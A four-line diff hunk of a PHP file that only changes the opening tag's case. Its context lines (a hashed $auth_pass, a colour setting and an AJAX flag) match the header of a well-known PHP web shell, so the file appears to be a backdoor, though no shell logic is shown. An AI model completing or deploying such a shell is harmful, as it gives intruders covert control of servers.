@@ -1,4 +1,4 @@
-<?PHP
+<?php
 $auth_pass = "55b37c5c270e5d84c793e486d798c01d";
 $color = "#ddff55";
 $default_use_ajax = true;
